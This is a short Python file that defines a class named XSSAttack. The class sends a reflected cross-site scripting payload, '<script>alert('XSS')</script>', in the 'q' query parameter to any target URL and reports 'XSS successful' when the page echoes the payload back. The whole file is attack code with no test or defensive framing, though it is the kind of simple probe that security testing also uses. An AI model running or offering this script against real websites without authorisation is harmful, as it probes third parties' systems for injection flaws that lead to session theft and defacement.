import requests

class XSSAttack:
    def __init__(self, target_url):
        self.target_url = target_url

    def exploit(self):
        payload = "<script>alert('XSS')</script>"
        response = requests.get(self.target_url, params={"q": payload})
        if payload in response.text:
            return "XSS successful"
        return "XSS failed"
